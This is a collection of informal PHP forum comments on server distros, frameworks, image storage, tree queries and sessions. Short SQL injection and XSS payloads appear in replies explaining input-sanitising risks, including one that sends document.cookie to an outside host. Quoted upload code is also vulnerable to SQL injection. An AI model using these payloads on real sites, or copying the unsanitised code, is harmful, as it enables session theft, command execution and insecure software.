We were all in that same position, before we learned.
JeOS is a specialty distro built specifically optimized to run under VMWare, which Linode doesn't run. If you're running Linux VMs under VMWare, I'd guess it'd be a good choice. Never used it myself, so I can't really comment intelligently about its benefits. Part of the distinction here though really boils down to this: simplicity. Ubuntu has a lot of customization that, while excellent for the desktop environment, doesn't make as much sense on the server side. Ubuntu server without X is remarkably similar to plain Debian, in which case I really don't see the benefit of Ubuntu server over Debian, *unless* of course you're signing up for support from Canonical. I like to keep my servers pretty simple/clean, and because of that I would choose Debian over Ubuntu (having run them both in production). But, really, it's always a matter of preference.
Looking through my code I did see 1 query not related to getting message that I could fix by adding a LIMIT 1. thanks for getting me to look through that! as for the actual message query, it's: SELECT * FROM messages WHERE userid='$strangerid' AND id &gt; '$lastMessageId' looks good to me, although, it might be hard to tell w/o seeing code
This isn't that hard, just figure out a good way to draw the tabs... there we go 113 bytes.. should not be hard to beat..
CodeIgniter has some good documentation but for certain things like layouts, you may need to figure some stuff out. If you have no coding experience, I'd say learn some basic PHP first &amp; you'll come to appreciate frameworks later. To create templates/layouts with CodeIgniter, I ended up going the route of extending my controller with MY_Controller.
Says [this](http://www.pathname.com/fhs/pub/fhs-2.3.html). Not exactly the IEEE or ISO shooting lightning from on high or whatever, but it's still the default in at least Debian/Ubuntu moving forward, so "standard enough."
How is the scheme I use not organised? For an added bonus you can have ./client/site/ too! The script I posted earlier in the thread could also be modified to use a sqlite database as a backend so other scripts can use the site information.
Holy shit you're awesome! This is going to sound stupid (and definitely over-simplified), but everything I've heard about MVC, as far as web dev goes, seems to break down to this: View = Site structure. Includes, layout, presentation, etc. Model = Database structure, SQL statements, table queries, etc. Controller = PHP. The language that puts it all together. It controls how to 2 interact. Now, I know that's oversimplified and it's much more complex, but is that [sort of] how MVC works? Am I really far off here? Either way, it seems wayyy too complicated for me right now. I think I'll stick to hand-coding standard PHP until I'm more comfortable with it. I've created 2 PHP sites (simple things like creating user registration and related databases, a simple commenting system, an image resizer and a file upload function*) and next I have 2 small projects that are just as simple. I think that I'll work on these next 2 projects to get more comfortable with the language. Then I guess the right move is to try learning OO PHP before getting too into frameworks. There's really so much to know. *I made sure to research security issues and how to sanitize inputs before launching. That's one aspect of PHP that I do have a decent understanding of. Anyway - your amazing for writing this up. I really appreciate it. Thank you.
Lol. Somebody doesn't know what a standard is. 
&gt;I'd say learn some basic PHP first &amp; you'll come to appreciate frameworks later Yeah - I gotta start smaller. I do have an okay PHP knowledge - I've created a few sites that allow user registration and database queries, file uploads, etc - but not enough for anything complex and I guess nothing regarding frameworks or OOP. &gt;To create templates/layouts with CodeIgniter, I ended up going the route of extending my controller with MY_Controller. I don't know what that means... maybe one day I'll be able to revisit this thread and make sense of everything. Thanks for the help and insight!
Just echo the contents of the blob after the header. The text is corrupting the image data. Then treat the php file as you would an image on the client side, i.e. &lt;img src = "blah.php" /&gt;
Oh, and $query = "SELECT image FROM names ORDER BY RAND() LIMIT 1"; You don't want to be returning the entire table every time you run the query.
so how would I write that. echo what
Looked a bit closer at your code, let me clean that up a bit... /*...*/ $query = "SELECT image FROM names ORDER BY RAND() LIMIT 1"; $result = mysql_query($query) or die('Error, query failed'); $row = mysql_fetch_assoc($result); header ("content-type: image/jpeg"); echo $row['image']; exit; notice the mysql_fetch_assoc() line, and shaunc's change to your SQL.
you are very kind. However I am uploading using the code below and yet I still can't seem to retrieve any images from the database... &lt;?php //upload.php echo &lt;&lt;&lt;_END &lt;html&gt;&lt;head&gt;&lt;title&gt;PHP Form Upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;form method='post' action='upload.php' enctype='multipart/form- data'&gt; Select File: &lt;input type='file' name='filename' size='10' /&gt; &lt;input type='submit' value='Upload' /&gt; &lt;/form&gt; _END; require_once 'login.php'; $db_server = mysql_connect($db_hostname, $db_username, $db_password); if (!$db_server) die("Unable to connect: " . mysql_error()); mysql_select_db($db_database) or die("unable to select database: " . mysql_error()); if ($_FILES) { $name = $_FILES['filename']['name']; move_uploaded_file($_FILES['filename']['tmp_name'], $name); echo "Uploaded image '$name'&lt;br /&gt;&lt;img src='$name' /&gt;"; $query = "INSERT INTO names VALUES('', '', '$name')"; $result = mysql_query($query); if (!result) die ("tits amdaf" . mysql_error()); } ?&gt; 
Haven't personally used it but does look interesting. I've found that a lot of stuff you'd normally do in PHP can be done in JS pretty easily as well. e.g. explode(',',$csv_line) String(csv_line).split(',') And their version seems a little "Verbose". http://phpjs.org/functions/explode:396 Some of the other functions look pretty handy though.
thank you, looks interesting
Like i said simple and fast, obviously not long term. I don't think your users will notice 3 seconds. Please link me.
It's a horrible idea storing images in the database, it ads so much more overhead to serving it. If you can, unless you have a very good reason, you should really avoid this.
I actually have not heard of this despite be pretty well versed in a lot of JS libraries. Nice find! Tons of useful stuff in here for the "damn it I've been in PHP for 18 straight hours and I'm trying to use PHP functions in my JS and shit is blowing up" moments.
Stoney, who keeps downvoting you, seriously? People, be (wo)?men and state a reason for the -1.
well my idea is to create a site where you get two images, vote on your favorite and you get two new ones. is this not the best way to do this?
&gt;shit is blowing up happens all the time. 
Angry people who disagree. (shrugs) Thank you for the kind words. I don't actually fret that much about votes, though. :)
What strikes me is that on /r/php you get downvoted becuase people accuse you of being an asshole, idiot, and general "arrogant bastard" simply for speaking the truth. Because of that, I have a very low valuation of the bulk of active voters in /r/php and far more respect for the people at StackOverflow, because at least there, people almost always say why the -1 you.
it would be reaally funny to write a conversion to take a PHP app and convert it to work on node, using these functions for compatibility 
Why would you store images in a database to begin with? Chances are you're botching one of the charsets in transit. But seriously, why would you want this in the first place? Incidentally, stop selecting the entire database, shuffling it, then returning that row. Instead, get the count of rows, pick a random number up to that, check to see if that's a valid row id, and if so, return that.
God, no. Put them in the filesystem and be careful about permissions.
A better way would be to store some representation of the image as a pointer in the database and keep the images out on the server or on a CDN somewhere. The functionality of your concept isn't impacted at all by having the images not in the database, but the application will scale and operate better. In other words, if you have thing1.jpg and thing2.jpg, just store file names, no need for the entire image. Alternatively, just store the images intelligently and settle on a universal extension you plan to use and you can just function from standard autoincrements or something... 1.jpg, 2.jpg, 3.jpg, etc.
&gt; I don't think MySQL is an appropriate solution for enterprise level applications. That's nice. The original poster does, and wasn't asking for a religious pulpitry. &gt; It just doesn't scale well. Well enough to run Google AdWords.
A framework is basically a bunch of libraries that make common tasks much easier &amp; a predefined site structure which you can usually modify easily with config files. It sounds like you'd benefit from learning one but it just takes time to figure out how each works. With CodeIgniter, when you load a view, it loads the whole page with that PHP file. By extending upon the controller with a custom controller, you can load views for different portions of you site that you want to stay the same (navigation, header footer etc) &amp; then use your controller to load your content view based on the controller being called.
Used it once, does some nice stuff but at 126kb minified I decided "sod it i'll just do it properly". Good if filesize isn't an issue.
I've used part of it in a node.js app to support the PHP serialization format.
`/srv/` is by no means a standard, and if you happen to use something with a less nonsensically partitioned filesystem, it's a Bad Idea (TM). On FreeBSD (and likely most non-linux unices), with default partitioning, `/srv/` will result in the websites being placed on the root partition (usually ~500MB, softupdates disabled). `/var/` has certainly never been standard on FreeBSD, and on a properly partitioned system is probably again a Bad Idea. According to `man hier`: /var/ multi-purpose log, temporary, transient, and spool files `/var/` is for frequently changing files, and again, typically isn't very big. (Typically 500MB-1GB unless you're running a mail server with huge spool files.) Standards are not defined by "used on one specific strain of Linux". Just because Debian/its derivatives do it, doesn't bring it anywhere near a standard. I usually go with `/usr/local/www/`. `/usr/` as the change frequency of the files is similar to that of most of the `/usr/` partition (it also contains the home directories). `/local/` as they are not base system files, but specific to that server. In the `www` directory, I organize it as: www/domain.tld www/domain.tld/htdocs www/domain.tld/logs -&gt; /var/logs/httpd/domain.tld/ www/domain.tld/cgi-bin www/domain.tld/conf Subdomains are placed under the tld as: www/domain.tld/subdomain./ With the same (htdocs, logs, cgi-bin, conf) setup inside.
I'd say views are going to consist of mostly html &amp; function calls to load different sections of the page or do different tasks such as loading dynamic content, models contain database functions &amp; logic, controllers load views &amp; other code based on a calls based on a post call. That's my basic understanding although there's a little more to it &amp; I may not have articulated it the best way possible.
any reference sites that can teach me how to do this?
do you have any reference sites to help me learn how to do this?
I think line #38 should be : if ($_entropyBottom &lt; $_entropyTop){ instead of if ($_entropyBottom &gt; $_entropyTop){ Also, on every loop, you are recutting the image and recalculating the entropy when you can cache whichever is greater and avoid a lot of memory use/cpu time. That being said, it looks like this code is based off: http://brainacle.com/2010/10/14/calculating-image-entropy-with-python-how-and-why - I don't think it's an optimal method for checking entropy at all, but it's definitely a neat proof-of-concept. 
No, that pretty much makes sense. In simple terms. MVC sort of makes sense to me. Now I guess I have to start learning OO so I can make sense of everything.
Why god? why? Store the file path in your table. Store the file in your **file**-system
I've pulled individual functions out of it from time to time; things that I needed to behave the same on both server side and client side. uniqid() was one, usort() was another.
Alloy is, by all appearances, very well done. Though I have only perused the source a few times. It is easily among my top 10 in terms of good practice and code-quality. *Edit: downvote, srsly? I don't work for Alloy*
how might i do this?
The reason why is that your initial script only sets session data on page load. Therefore you should make your Ajax call not just set the session data, but return it in JSON format or something. That way the javascript on the initial page can take note of changed session variables. You could store all the session data in a local variable called sess or something. This is simply the way sessions in PHP are designed. Each page will have access to the super global $_SESSION at the time of that particular page load. If you are doing Ajax calls then you are asynchronously messing with $_SESSION after the page load. PHP is server side so PHP variables cannot be updated and accessed after the page is loaded. Let me know if this helped or was just more confusing. I didn't proofread it.
php.js is great if you know of how to do something in php but want to learn in javascript. I typically dont even copy the function from php.js but read it and do it the JS way. It probably goes with out saying, but if your looking into messing with javascript, use jquery.
I've used it for *htmlspecialchars* and *date*, which are handy. The *date* function is particularly awesome. 
Yeah, actually if you look at my revision, it was originally like that. But, when I ran it against the comic in the original post, it cropped wrong. So maybe the return value in function entropyCalc() should not be multiplying by -1? Good call on caching the image slice though, I'll work that into the next revision.
I tried to use it in Node.js too (for binary serialization) and it was a complete mess )
Am I risking a huge downvote if I declare that code igniter is one of the easiest frameworks to learn to get used to OOP and the MVC setup? Well lets find out...
You're confusing a few different things here. First, you're pulling from the database but not actually using your results. Second, the header means you're serving up a jpg, but you're actually outputting HTML. Third, you say you're trying to display an image pulled from the database, but your code would only display the immediately uploaded file. Try breaking it down like this: * Save the uploaded file * Store the filename in the database * SELECT a random row with the filename * Create a page with PHP and echo the filenames in to your img tags You can find implementation details on the internets. You've got most of the pieces already, they're just not assembled correctly.
There's a syntax error in the Javascript. Also, the whole concept is retarded.
 I love Symfony + Doctrine and am *really* looking forward to S2. (Still using 1.0 for an enterprise project.) And am with you in that my experience with Symfony was greatly enhanced because of earlier experience with CI and other custom frameworks.
At least 7 syntax errors in JavaScript. Also two calls to the same function?
Plus, null context of the return value means you have a mute cat.
How would you do this more efficiently? 
Assuming you just want one row from the table, just add the LIMIT 1 clause to the end of the query.
If you guys like Prince, [DocRaptor](http://docraptor.com) is an awesome alternative without the price. It uses Prince XML as the engine and supports everything Prince supports, but it's a web service with nothing to download and much cheaper fees. 
I recommend you read up some more before trying to make something like this - you obviously don't understand a lot of what you've written. If you just google "php upload tutorial", you'd find plenty of information. A few problems with the snippet you just posted: * There's no point opening the php tag and echoing out plain html - just open the php tag after the chunk of html * Invalid html - no closing tags, doctype etc * When using move_uploaded_file, you're meant to give the destination relative to the system root * You could have used the return value from move_uploaded_file, which would have told you that it wasn't working. See [here](http://php.net/manual/en/function.move-uploaded-file.php) * You haven't escaped $name before using it in your query - a filename with a single quote in it and users can directly execute sql commands * Not checking the extension of the uploaded file - someone could upload anything like a php shell script Also, as it says in the sidebar: &gt; News that relates to PHP, along with tutorials. &gt; &gt; Having problems? Check out r/phphelp
&gt; The hard coded url is https. The only thing I can think of is that somehow the domains aren't being seen as the same on each page even though they are. It's this. If you want to start up the same session in the secure domain you're going to need to pass the session ID around and start up that particular session explicitly in the AJAX script. You should be able to do that by specifying a GET PHPSESSID parameter.
base64_(en|de)code
Oh. I read that wrong. I am tired and thought what you wrote returned the entire table. I was in a mini panic mode, "OMG I'VE BEEN DOING IT INEFFICIENTLY THIS ENTIRE TIME!!!"
There is also [Aptana](http://aptana.com/), based on Eclipse, but made specifically for PHP and Web development. 
I've noticed that whenever I get coder's block, one of the first things I do after a few weeks off is jump into CSS, just mindlessly trying different things. Before I know it I'm working on an actual programming language again. 
Fuck yes, my man! You remind me of me, and I'm fucking awesome. I have this to add: When you think about that competitor, you also think about the features on your site that are innovative and not on theirs, and then you think about how batshit insane you would feel if they roll out those very features. It's only a matter of time before someone on the competitor's team thinks up your great ideas. SO GET IT OUT NOW!
I don't get it. You're trying to prove the point that server-sided scripting is better than client-side scripting? If so, you've presented a totally invalid point, and on-top of that, you've provided completely invalid client side code. But to humor you, and all the other redditors here, I'll provide the appropriate JavaScript code, using an object oriented approach. &lt;script type="text/javascript&gt; function Cat(name, type) { this.name = name; this.type = type; this.toString = function() { return "Meow! My name is "+this.name+", and I'm a "+this.type+"!"; } this.meow = function() { return "meow!"; } } myCat = new Cat("Scruffy", "tabby"); document.write(myCat.toString()); &lt;/script&gt;
Make a script with the following 2 lines: `session_start(); echo session_id();` Run the script in your web browser with both http and https, then call it with ajax, both http and https. You should see the same results in all cases.
It's *all* about the 2nd edition. 
Why, Wolfram, why *XML*? 
http://php.net/manual/en/function.readfile.php You can use readfile with files that are stored in a non-web-accessible directory also.
Agreed. I'm in love with Ruby/Rails/Python/Django, but the world is on a LAMP stack running a PHP application. 
I remember my first home-made admin had user_list.php , user_add.php, user_edit.php, user_remove.php . After doing that with a few freelance projects, I realized that I was essentially making UserController with actions list, add, edit, remove. Models may seem complex to you, but in a nutshell it's where you do database stuff like insert, update, select, delete . The view is where all of the html should go. That's a quick rundown of Model-View-Controller for ya.
Out of curiosity, did you ever find a nice binary serialization library for node?
I don't think OO is that difficult but I do think it's hard to find good tutorials that explain PHP OO. Honestly I'm just starting to mess with it but I've done OO programming in the past so really I just need a little more practice with the syntax. There was another post here I read earlier where someone was getting down voted for acting like it's not that hard but there's some truth to what he was saying. Find a good video tutorial &amp; I'm sure things will start clicking. I was starting to check these out last night: http://www.killerphp.com/tutorials/object-oriented-php/ Might be a good place to start
Thanks! I'll check it out. I had a pretty good tutorial saved on my bookmarks at work. I'll see if I can find it tomorrow.
That actually does help. So would list, add, edit and remove be created as classes? (or is object the correct term?)
Hmmm, interesting. I never really seen it. But interestingly enough I was just struggling with the difference between urlencode in php and unescape in javascript. 
Um.. thanks for the edit. I'll fix it sometime eventually. My point isn't saying one is better than the other, it's merely my simple way to distinguish the differences between client-side and server-side. I would share the article, but I fear getting ripped apart. The image is from a tutorial I'm writing for a friend and I promise my PHP isn't sloppy like this example. I never intended for the code to work.
There is a good discussion about this here: http://stackoverflow.com/questions/3748/storing-images-in-db-yea-or-nay
To sort of hijack your post, I'd planned something similar for an upcoming project, myself. I was planning to proxy through Nginx to a Node server. To those who know more about this, would I be setting myself up for a big bottleneck with Nginx? It seems like setting things up this way would make life easier from a development standpoint, but I don't want to take a big performance hit and defeat the purpose of using Node entirely.
lol, what are the odds.....I'm the one who wrote most of the current version, but the previous version was just plain wrong and not close to the PHP version at all (see my comment there). Can't believe that was 3 years ago... In short, yes, the following will be what you need 99% of the time: "some,string".split(','); However, the problem is that there are many edge-cases for this function in PHP; quick example: // js "foo bar".split(''); // split on empty string &gt; ["f", "o", "o", " ", "b", "a", "r"] // php explode('', 'foo bar'); &gt; false Go ahead, try and make a port of a simple function yourself -- you'll quickly find out just how well you know (or don't know) each language.
I've never had a problem with the native JS Date object...
Neither have I :)
The problem is that client-side example has more steps than the server-side example. But what would actually happen is the client would already have the code to create the cat on the first request. Client-side example: * Client loads cat-builder page * Click button to create cat. * Client creates cat using JavaScript Server-side example: * Client loads cat-builder page. * Click button to create cat. * Client sends request to server for cat and displays result. Your diagram makes it look like the server-side example is more efficient when it actually results in an extra request to the server. 
For me: * array_unique * ksort * strip_tags * array_merge * urlencode Very good resource.
 +-------+------------------+------+-----+---------+----------------+ | Field | Type | Null | Key | Default | Extra | +-------+------------------+------+-----+---------+----------------+ | id | int(10) unsigned | NO | PRI | NULL | auto_increment | | path | varchar(255) | NO | | NULL | | +-------+------------------+------+-----+---------+----------------+ 
Yeah, you are correct. I missed the semicolons in my example. I've updated it now, but I also found the problem: the content chunk was being passed along in a POST without being escaped. I used JS escape() and PHP urldecode() and it solved the problem.
Yes, I used bits.js from node-postgres code, then switched to buffer-extras (from new node-postgres code).
I tend to do a google search when coding in JS PHP function X in Javascript. normally gives what I want but this is useful as a guide. Would highly advice including the WHOLE file //Edit Just noticed my error, highly advise AGAINST including the whole file.
I've used it before. It's great in the sense that you may want to write something in javascript that has already been done in PHP. You can simply grab the code from php.js so it saves time. There's a time &amp; place for everything.
nginx will cope fine.
The point isn't to take the whole framework and use it exactly like PHP. But to take the few functions you need, and use them.
Interesting. I don't really consider this PHP specific. Probably would be better in r/programming.
Not performance wise no - you can still keep the data in MySQL - but the way you are doing it involves; browser -&gt; your server ---- "can I have the html page please" The server then goes, runs the php which connects to mysql, does some queries, makes the html and sends it back. the browser then parses that, finds there is an image tag (or more, amongst others) and does; browser -&gt; your server ---- "can I have the image please" The server then goes, runs the php which connects to mysql, does some queries, echos the image back... The "better" way of doing it would be to keep the first step roughly the same, but have the image on the filesystem (web-accessible) and serve it directly, in which case the webserver wouldn't have to run any php, or connect to the mysql server. Avoiding ALOT of extra overhead. If you require logging of images loaded, you have two options with the above, a) assuming they are displayed if they were sent to the browser in HTML b) parsing the logs from the webserver. Russ
Though, I'd suggest that the path should probably just be the filename, and you should be careful about the filename and stripping any crap out of it. Usually, I use the sha of the file + the extension for the server side filename, this helps avoid duplicates and stops anyone doing anything odd. Avoiding using the path also means you can move the folder around with minimal hassle if required.
Sweet! Thanks for the input. I'll work on adding this today and post my results ;)
yeah. the session id is the same on both the calling page and the receiving page.
Why would you want the latter instead of the former?
IIRC, json_encode is actually faster than serialize, if you have the choice.
Perhaps you wouldn't, but the point of the project is to simply port PHP functions in to JS. Thus meaning the output of the function needs to be the same in both languages..
This. I personally use it when I build quick prototypes of apps as being able to use the same functions in both languages shaves a lot of time.
It's handy if you'd rather spend time prototyping rather than tweaking. I use some of the stuff until I can replace it with something more specific to the project at hand.
I haven't been around to thank you for this but I just implemented it with VERY little modification and it works flawlessly. Thanks!
Yup, I use it solely for the base64_(en|de)code functions as well as serialize. 
Though unlikely, if you're using PHP 5.3+.. [Transparent load balancing and sharding with mysqlnd](http://blog.ulf-wendel.de/?p=298) is a *very* interesting proof-of-concept.
Actually, one follow up question. This prints a full tree. How would I have it put the Category name at the top, then a list of just that category's items. THen next category name, followed by a tree of that category?
Well, I tried passing in the session id from the calling page and verified that it was making it over to the ajax handling page but the session variable still does not show up in the calling page. Just to clarify, I have debug code to display the results of the ajax page and then I refresh the calling page that also has debug code to show the $_SESSION data. But, frustratingly enough, the session variable that IS set in the ajax page simply is not being shown in the calling page. Also, both the calling page AND the ajax page are both in the same domain and SHOULD be under an HTTPS context but maybe this isn't the case?
Seconding Head First SQL.
DOMPDF: ob_start(); // HTML with inline &lt;style&gt; here $contents = ob_get_contents(); ob_end_clean(); $dompdf = new DOMPDF(); $dompdf-&gt;load_html($contents); $dompdf-&gt;render(); $dompdf-&gt;stream('pdfReport-' . time() . '.pdf', array('Attachment' =&gt; '1'));
Don't worry - it already is and there is more discussion there : http://www.reddit.com/r/programming/comments/f9bpn/how_proper_amount_of_detail_and_proper_amount_of/ 
Why not download the source and find out for yourself?
I've actually been doing this for an hour ... still trying to find my way around. Was hoping someone could point me in the right direction, or an article on a different website that helps explain this.
http://www.uniformserver.com/ IIRC it has Apache, PHP, MySQL with PHPMyAdmin and maybe some other stuff. You can run it off a memory stick, it has zero reliance on installed components so it is 100% portable. We used this in Uni for web related subjects.
Of course I should have remembered that Reddit uses Cassandra, not MySQL or PostgreSQL or Oracle.
How often are nodes going to be added to your tree? I know of some novel techniques for storing hierarchical data in a relational database but there is absolutely a trade-off between read and write. Have you thought about using Disqus? How about storing comments in BDB with XML support? Or storing the comments in XML files, manipulating with libxml2, and storing a path in the database? Hell, you could store the comments as files and use the filesystem as your tree.
The schema/queries in that link are not scalable, but to a certain extent, the method they use is. If you use an AI ID as your primary key, and an indexed column with the parent ID in every row, you can order by parent_id, id and get a list of every comment in a thread in the order you're expecting. I've done this (granted I force a stop at five nest levels because the UI didn't support it, but it would work fine with more) on a large site.
I'm not going to actually implement this as a comment system, so I can't use a premade application. I'll read up on BDB. Having no formal programming training, the only times I hear about all these tools is when someone on forums I visit volunteers the information.
JeOS is a concept, I'm not really talking about a specific distro. I just tend to think of Debian as super old and bloated.
BDB might be a little heavyweight, especially if you are on a shared hosting environment. More specifics about your problem would help me narrow down a good solution. 1. Is this one large tree or many trees? 2. Either way, how many nodes per tree do you expect? How many levels? 3. Do you need fast random access into the tree structure or will you be delivering the whole thing each time? 4. Do you expect this to be more read-heavy or write-heavy?
Debian is probably the smallest footprint base install out there. It's loaded down when you build a machine with multiple profiles, e.g. Desktop, Web Server, File Server, and Mail Server profiles load up a bunch of extra stuff you probably don't need. From my past experience (with older releases, yes) Redhat is about 150% bigger, for just the base install. SuSE is about 175% larger, and Ubuntu is about 250%. Debian has more packages than many distros, but this is because packages are far more discrete. For example, Openssh server and client are separate packages. Postfix might consist of five or six packages to install just the features you want, not one monolithic package which installs every option. At the time of their release, Debian packages are usually as up-to-date as any distro, but Debian has a two year stable release cycle which is nice and predictable for admins. I've managed, professionally, for 15 years, Linux servers on everything from Slackware to Ubuntu, and Debian has been my choice for nearly a decade now (once I got out of the hell that was early Redhat).
If there is more than one root node, i.e. multiple trees, in the table, can you write a query that fetches all the nodes in a single tree without using N joins (where N is the number of levels in the tree)? I don't believe this is possible.
Recursion and parent_id.
My application is nowhere near as heavy now, or will ever be as heavy in the future, as Reddit or come even close. It's a simple referral system, where a user may refer a friend who may refer someone else. Each user may see their referrals to 3 levels, but I was wondering how best to show the admins this information, when we want to see unlimited levels starting from the original referral down to the last subreferral. Right now, since the user's view is hard set to 3, I do a simple query, but even that rubbed me the wrong way. I know my app will never be big, but I can't help but think "what if there's 1,000 people checking stats, along with the overhead of the rest of the website?" and then 2 or more admins checking unlimited nested stats ... I'm sure our dedicated server would be more than able to handle it, but I'm always looking for a different way of doing things. Anyways, 1. One large, self-referencing tree 2. Unlimited # of levels 3. Most of the time it will be 3 levels (or less) that are returned 4. Most def. more read-heavy. edit: I believe self-referencing is best for this, right? I don't need to have another table defining the relationships, since each this is a one-to-many relationship, not a many-to-many
That's the *therefore* sign: http://en.wikipedia.org/wiki/Therefore_sign ALT-8756 ∴
Have you tried Arch? Linux from scratch? It can sound a bit daunting, but building a distro to suite your production environment can be very beneficial. Debian has a huge footprint compared to what you could do on your own.
Go with nested set. It won't be as bad as you think doing the rejiggering of lft/rgt, but make sure you do it within a transaction.
For an approach that is similar to nested set, but IMO better, check out this research: http://www.inf.uni-konstanz.de/dbis/publications/download/GKT-FDS03.pdf Also http://www.inf.uni-konstanz.de/dbis/publications/download/accelerating-locsteps.pdf
Actually they use PostgreSQL but not the relational part,e.g. joins. This is where Cassandra comes into play to do the mapping. [Lesson 3 from this article](http://highscalability.com/blog/2010/5/17/7-lessons-learned-while-building-reddit-to-270-million-page.html) kinda explains how they do it. The plan is to move to cassandra 100%. I don't know if this has [changed now](http://groups.google.com/group/reddit-dev/browse_thread/thread/e1b6d422fa445be7) but from [code.reddit.com](http://code.reddit.com) I can still see that a postgreSQL installation is still needed. [The actual code that does it](http://code.reddit.com/browser/r2/r2/models/link.py?rev=b9396594df80e609d57109b6747f50804f4bde12#L287) and a [relevant article](http://bret.appspot.com/entry/how-friendfeed-uses-mysql) on how it could be done with mySQL (although don't take my word)
Well, I have all comments associated with an item, so in order to get all threads on one page, I just query by the item ID. Traversing down the tree is relatively simple. If you wanted to find siblings/parents/grandparents/etc from some random array of comment IDs, it would be more difficult. What I do is grab all the comments associated with an item, ordered by threads and then create a double-linked list, allowing stuff like traversal/collapsing from anywhere. 
I like your suggestion, but what desktop gui comes with ubuntu server edition?
Yes, both. I've also packaged software for use by RPM-based distros and dpkg (apt) ones. I started using TAMU and then Slackware way back in the day (92 or 93, a couple years after the first kernel builds) when you had to compile a special version of GCC under Solaris to cross-compile the kernel for x86, and move it over to your intended box on floppy disks. :) The thing is, when you're maintaining 20+ servers with differing requirements, building your own environment is a massive waste of time and energy. Give me one slim distro with a minimal footprint and a massive discrete package library you can rely on, security backports, and a good, stable, *working* package dependency system. And there you have Debian. On your own desktop, have at. I used to *love* Gentoo until another savvy *nix guy convinced me to benchmark my system, and it was negligibly different, speed wise, from anything else... for hours worth of compile time.
Yeah, this is the way I've been doing it...
Actually they use PostgreSQL but not the relational part,e.g. joins. This is where Cassandra comes into play to do the mapping. [Lesson 3 from this article](http://highscalability.com/blog/2010/5/17/7-lessons-learned-while-building-reddit-to-270-million-page.html) kinda explains how they do it. The plan is to move to cassandra 100%. I don't know if this has [changed now](http://groups.google.com/group/reddit-dev/browse_thread/thread/e1b6d422fa445be7) but from [code.reddit.com](http://code.reddit.com) I can still see that a postgreSQL installation is still needed. [The actual code that does it](http://code.reddit.com/browser/r2/r2/models/link.py?rev=b9396594df80e609d57109b6747f50804f4bde12#L287) and a [relevant article](http://bret.appspot.com/entry/how-friendfeed-uses-mysql) on how it could be done with mySQL (although don't take my word)
You *can* install Ubuntu server without Gnome, but most installs end up with gnome-core and then gnome-desktop on it at one point or another due to management tools which have dependencies on X libraries. edit: I think it's only fair that I should say that I've said this as a long-time professional *nix admin and developer, and the GUI tools available for Ubuntu server *are* very nice and generally a good thing, especially if you're a neophyte. I prefer editing server configurations the traditional way though... by waving tiny magnets carefully over the right spots on the disks, and by invoking the names of the old gods.
I gotcha. Yeah with just id/parent_id you can't select one tree at a time without N joins, but with id/tree_id/parent_id you can. In this case, your tree_id is item_id, since there is one tree per item. You can't select a portion of one tree at a time without N joins, but unless the tree exceeds available memory who cares.
recursion and parent_id is terrible inefficient in large trees since you probably have to do 1 select query for each branch that exists. You can do this if you have lots of Inserts/updates and only a few reads. The nested set model is optimized for lots of reads and only a few inserts/updates. with a nested set you can quite easy pull the complete subtree from your database with just one select, and with a bit of tuning you won't get any issues here even if you have millions of records in your tree table (tried that on a 4y old laptop). Inserts and updates are a bit of a bitch, but in my case it was the best solution because i had only 1 insert for maybe 30.000 selects. pro-tip: get jsTree (jsTree.com), there is already a php class includes that can handle all your inserts and updates ...
Very, very poorly. The answer in the MySQL manual is equally bad. They should be using a closure tree. I've told them this many times. The server load reduction would be massive. Start at page 47. http://www.slideshare.net/billkarwin/sql-antipatterns-strike-back Basically, if you're thinking about imitating reddit's architecture, don't.
Closure trees. Page 47. Adjacency models and edge painting (aka nested sets) are unbelievably bad. http://www.slideshare.net/billkarwin/sql-antipatterns-strike-back
&gt; The schema/queries in that link are not scalable, but to a certain extent, the method they use is. Sure, if you throw hundreds of thousands of dollars of unnecessary hardware at it, quintuple your hosting costs and accept several daily hours of sporadic downtime.
It's very simple. Just grab ALL comments for the thread and do the nesting of the comments with php. 
Try creating a Model class and using inheritance to share DB behavior between your DB-backed objects. This usually implies some kind of consistent structure to the data model itself.
Something like sql'+;GO+EXEC+cmdshell('httpd stop')+-- will shut down the webserver, assuming the data is handed over to a mysql database.
So would the abstract Model class also handle the DB connection?
Good solution.
One of many. I'm aware of 14 meaningfully different legit ways to store trees in SQL. The two common ones are the worst two, hands down.
The DB connection could be a protected static property on the Model class, so subclasses would be able to use it.
Are you familiar with the stuff the Pathfinder/XQuery guys have been doing? I think it's pretty neat. Links are in this topic, and more pubs are here: http://www-db.informatik.uni-tuebingen.de/research/pathfinder/publications Particularly interesting is how they are handling updates: http://www-db.informatik.uni-tuebingen.de/files/research/pathfinder/publications/updating-pre-post.pdf
oh that's evil.
If you simply want to automate the form textfields and don't really care about much else, you can do a `SHOW COLUMNS FROM table` and then a foreach through the results.
This also makes an assumption that mysql has command line permissions and that the command is correct. Even if I didn't sanitize data that command does not work on my server. 
No no , sorry I think this is great. But I was just sleepdeprivated
I was thinking about writing my own series of functions to basically go down the line generating form elements based on what columns were returned but it seemed like something like that has to have been done before with much more flair than what I'd be able to give it.
What about something that isn't sent to an SQL?
Perhaps something like: &lt;script src="http://evil.com/evil_xss_script.js"&gt;&lt;/script&gt; If someone is tricked into submitting the form with that variable, it loads a script from your own site, allowing someone to get their information off the page and make actions on their behalf. This is XSS, look up Cross Site Scripting security on google.
XSS: &lt;script&gt;alert(document.cookie);&lt;/script&gt; May need to be tweaked depending on the placement in the document of the variable being exploited.
Good point, thanks. Do you think most frameworks work along these lines?
A simple one is using document.cookie, assuming you're storing anything important in cookies, such as the session id. &lt;script&gt;window.location='http://www.malicioussite.com/script.php?cookie='+document.cookie;&lt;/script&gt; Edit: just noticed it looks like kudoz beat me to the document.cookie by a few minutes.
If you are very new, you should not jump into frameworks right away. However, if you are feeling ready for it, CodeIgniter is a good entry-level framework to begin with.
Most of the MVC frameworks out there will do exactly this. I personally prefer [CakePHP](http://www.cakephp.org) which has been known to handle large databases. Unzip it, edit configuration files, then run a few console commands the code and you have a basic site with add/edit/remove pages for all your tables. Auto-creates the controllers/models/views for you. 
Have a read [here](http://www.reddit.com/r/PHP/comments/f39ff/php_frameworks_which_one_do_you_prefer_and_why/). Not specifically MVC (and I don't know all of those), but the main ones seem to be MVC driven.
I agree with you, CodeIgniter is a really good framework with a great degree of customization and really useful libraries and helpers. EDIT: [A great series of CodeIgniter tutorials from nettuts](http://net.tutsplus.com/sessions/codeigniter-from-scratch/) :)
&gt; Let me know if this helped or was just more confusing It reads like either you are on a heavy acid trip, you didn't read the original question, or you don't understand sessions.
